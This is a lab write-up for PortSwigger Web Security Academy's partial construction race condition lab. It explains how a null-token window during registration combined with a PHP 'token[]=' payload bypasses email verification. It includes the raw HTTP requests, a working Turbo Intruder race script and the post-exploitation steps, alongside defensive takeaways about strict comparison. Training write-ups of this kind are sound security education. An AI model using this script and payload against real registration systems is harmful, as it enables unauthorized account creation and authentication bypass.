# Partial Construction Race Condition

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Expert  
**Category:** Race Condition / Authentication Bypass  
**Lab:** Partial construction race conditions  

---

## Overview

This lab demonstrates a race condition vulnerability in a user registration system. By exploiting a timing gap during account creation, it is possible to bypass email verification entirely — registering a valid account without ever owning or accessing the target email address.

Unlike the file upload race condition which exploits a gap between save and delete, this attack exploits a gap between **user creation and token storage** — a partial construction window where the token is `NULL`.

---

## Objective

- Bypass email verification during account registration
- Create a valid account without accessing the confirmation email
- Log in and delete the user `carlos`

---

## How the Application Works (Normal Flow)

```
1. User submits registration form → account created in database
2. Server generates a confirmation token
3. Token stored in database against the user record
4. Token sent to user's email
5. User clicks link → /confirm?token=XYZ
6. Server validates token → account confirmed
```

---

## The Vulnerability — Partial Construction Window

The critical flaw is in the gap between **steps 1 and 3**:

```
Account created in DB ──→ [GAP: token is NULL] ──→ Token stored in DB
```

During this tiny window, the confirmation token has not yet been written to the database. If a confirmation request arrives during this window, the server compares the submitted token against `NULL`.

**The exploit:** Sending `token[]=` (an empty array) causes PHP to treat the submitted value as `NULL` — matching the unset token in the database during the construction window.

This is called a **Partial Construction Race Condition** — the object (user record) exists but is not fully initialised yet.

---

## Why `token[]=` Works

In PHP, passing an array parameter with an empty value (`token[]=`) causes the backend to receive the token as an empty array or null-like value. When the server compares this against the database value during the partial construction window — where the token is genuinely `NULL` — the comparison succeeds and verification is bypassed.

| Submitted | DB token (during window) | Result |
|-----------|--------------------------|--------|
| `token=abc123` | NULL | Fail — mismatch |
| `token[]=` | NULL | **Pass — null matches null** |
| `token=abc123` | abc123 | Pass — correct token |

---

## Exploitation

### Step 1 — Capture the Registration Request

Registered with a `@ginandjuice.shop` email address and intercepted the POST request in Burp:

```
POST /register HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: phpsessionid=<session>
Content-Type: application/x-www-form-urlencoded

csrf=<token>&username=%s&email=test@ginandjuice.shop&password=12345
```

Note the `%s` placeholder in the username — this gets replaced by Turbo Intruder with unique usernames for each attempt.

### Step 2 — Craft the Confirmation Request

The confirmation request uses `token[]=` to send a null-equivalent token:

```
POST /confirm?token[]= HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: phpsessionid=<session>
Content-Length: 0

```

### Step 3 — Turbo Intruder Race Script

Sent the registration request to Turbo Intruder. The script runs 20 attempts, each sending 1 registration + 50 simultaneous confirmation requests through the same gate — maximising the probability of hitting the partial construction window:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: phpsessionid=<session>
Content-Length: 0

'''

    for attempt in range(20):
        gate = str(attempt)
        username = 'User' + gate

        # Send registration request with unique username
        engine.queue(target.req, username, gate=gate)

        # Send 50 confirmation requests through the same gate
        for i in range(50):
            engine.queue(confirmationReq, gate=gate)

        # Release all requests simultaneously
        engine.openGate(gate)

def handleResponse(req, interesting):
    table.add(req)
```

**Why 50 confirmation requests per attempt?** The partial construction window is extremely narrow — measured in microseconds. Sending 50 simultaneous confirmations dramatically increases the probability that at least one lands during the window.

### Step 4 — Identify Successful Bypass

In the Turbo Intruder results, look for:

```
Account registration for user UserX successful
```

This confirms the race condition was won — email verification bypassed.

---

## Attack Flow Summary

```
Attempt N:
├── Registration POST (username=UserN) ─────────────────┐
│                                                        ↓
│                                              [PARTIAL CONSTRUCTION]
│                                              token = NULL in DB
│                                                        ↓
└── 50x confirmation POST (token[]=) ──→ One hits window → NULL == NULL
                                                         ↓
                                              Account confirmed ✓
```

Each gate groups 1 registration + 50 confirmations and fires them all simultaneously. 20 attempts = 20 gates = 1000 total requests.

---

## Post-Exploitation

### Login

```
Username: UserX   (whichever attempt succeeded)
Password: 12345
```

### Delete Carlos

1. Navigate to the admin panel
2. Locate user `carlos`
3. Delete the account → lab solved

---

## Key Differences from Standard Race Conditions

| Feature | File Upload Race | Partial Construction Race |
|---------|-----------------|--------------------------|
| Target | File validation gap | Token initialisation gap |
| Window | Milliseconds | Microseconds |
| Payload | GET request | Empty array token (`token[]=`) |
| Tool | Burp Repeater parallel | Turbo Intruder with gate |
| Attempts needed | 1 attempt usually sufficient | 20 attempts × 50 requests |

The partial construction window is significantly narrower — hence the need for Turbo Intruder's precision timing rather than Burp's native parallel sending.

---

## Key Takeaways

- **Partial construction vulnerabilities occur when objects are created before they are fully initialised** — the gap between creation and completion is exploitable
- **`token[]=` exploits PHP's type handling** — an empty array compared against NULL evaluates as equal in loose comparison; always use strict type checking (`===`) in authentication logic
- **More simultaneous requests = higher probability of hitting a narrow window** — 50 confirmations per attempt compensates for the microsecond-scale gap
- **Turbo Intruder is necessary here** — the window is too narrow for Burp's native parallel sending; Engine.BURP2 provides the precision needed
- **Email verification race conditions are a real bug class** — any registration flow that creates a user before writing the verification token is potentially vulnerable
- **`%s` substitution in Turbo Intruder** enables testing multiple unique usernames in one run — essential here since each failed attempt creates a new user record

---

## Real-World Relevance

This vulnerability class applies to any application that:
- Creates database records before completing their initialisation
- Uses multi-step processes where intermediate states are queryable
- Implements verification systems with a gap between record creation and token assignment

Real bug bounty examples include: account takeover via registration race conditions, password reset token bypass, and 2FA code bypass during session initialisation.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional (2023.9+) | Proxy, request interception, HTTP history |
| Turbo Intruder | Precision parallel request timing via gate mechanism |
| PHP type confusion (`token[]=`) | Null-equivalent payload for token bypass |

---

## References

- [PortSwigger — Race Conditions](https://portswigger.net/web-security/race-conditions)
- [PortSwigger — Partial Construction Research](https://portswigger.net/research/smashing-the-state-machine)
- [TOCTOU Race Conditions — OWASP](https://owasp.org/www-community/vulnerabilities/Time_of_check_time_of_use)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
